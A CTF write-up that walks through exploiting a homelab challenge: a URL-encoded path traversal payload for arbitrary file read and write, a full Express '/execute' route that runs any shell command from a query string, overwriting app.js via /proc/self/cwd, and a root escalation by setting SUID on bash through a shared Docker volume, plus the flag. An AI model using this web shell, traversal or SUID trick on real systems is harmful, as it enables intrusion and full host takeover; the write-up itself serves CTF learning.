---
title: "4T$ CTF 2024 - Homelab ? More like Pwnlab !"
date: "2024-11-10"
tags:
  - writeups
  - ctf
  - docker
  - privilege escalation
  - lfi
toc: true
math: true
bold: true
nomenu: false
---

We would start with 2 things:

- Web SSH Access (through the browser)
- Application with simple upload/download functionality

I found that the application does not enforce the paths for uploading and downloading and you can upload/download whatever file you want, you just have to URL encode it like so:

```
..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
```

I've also realized that this application is running in a Docker container, by going through the web SSH, I can see the docker compose file in `/home/admin/docker-compose.yml`.

In the source code of the application I had an odd route called `/restart` this would restart the application, meaning that something is running and it is making sure that this application keeps running even if I exit the process (that's what the `/restart` does). This likely hints that I need to change the application to gain RCE. So I've created another route called `/execute` and I've attached it to the `app.js` which looks like this:

```js
app.get('/execute', (req, res) => {
  const command = req.query.cmd; // Get the command from the query string

  if (!command) {
    return res.send(`
      <p>Please provide a command using the <code>?cmd=</code> query string.</p>
      <p>Example: <code>/execute?cmd=ls</code></p>
    `);
  }

  exec(command, (error, stdout, stderr) => {
    if (error) {
      return res.send(`
        <p><strong>Error:</strong></p>
        <pre>${error.message}</pre>
        <p>Command: <code>${command}</code></p>
      `);
    }

    if (stderr) {
      return res.send(`
        <p><strong>Stderr:</strong></p>
        <pre>${stderr}</pre>
        <p>Command: <code>${command}</code></p>
      `);
    }

    res.send(`
      <p><strong>Output:</strong></p>
      <pre>${stdout}</pre>
      <p>Command: <code>${command}</code></p>
    `);
  });
});
```

Then I've URL encoded it with CyberChief, and uploaded the file to this path: `..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fcwd%2Fapp.js`, then I restarted the application using the `/restart` route.

After that the route should be available to us, and I can execute arbitrary commands like: `/execute?cmd=ls`

```
Dockerfile
app.js
entrypoint.sh
node_modules
package-lock.json
package.json
public
views
```

Now earlier  docker-compose file (`/home/admin/docker-compose.yml`) which looks like this:

```yaml
services:
	webapp:
		image: webapp
		ports:
			"8080:5555"
		volumes:
			/home/user/nas_storage:/app/public/uploads
```

I can see that the container's path `/app/public/uploads` is mapped to `/home/user/nas_storage` path on the main server which I got web SSH access to, now here are the steps of how to privilege escalate to root:

- On the web SSH, copy the bash binary to the `/home/user/nas_storage/`
- On the docker container, make the bash binary owned by root and set SUID (u+s).
- On the web SSH invoke the bash binary with `-p`

And you should be root. Now you can read the flag located in `/home/admin/flag`

```
4T${pWnD_7h3_pwNl48??!}
```